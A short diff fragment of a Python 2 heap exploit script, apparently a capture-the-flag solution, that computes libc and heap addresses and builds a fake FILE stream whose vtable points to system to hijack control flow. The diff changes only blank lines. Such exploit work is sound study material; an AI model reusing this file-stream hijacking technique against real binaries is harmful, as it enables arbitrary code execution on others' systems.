@@ -29,7 +29,6 @@ iolistall_addr = libc_base + iolistall_offset
 stream_addr = heap_leak + 0x10
 vtable_addr = heap_leak + 0x108
 
-
 print "Heap: %x" % heap_leak
 print "IO_list_all: %x" % iolistall_addr
 
@@ -50,6 +49,7 @@ payload = stream
 payload += p64(1)
 payload += p64(2)
 payload += p64(3) 
+
 payload += p64(0) * 3 # vtable
 payload += p64(system_addr)
 
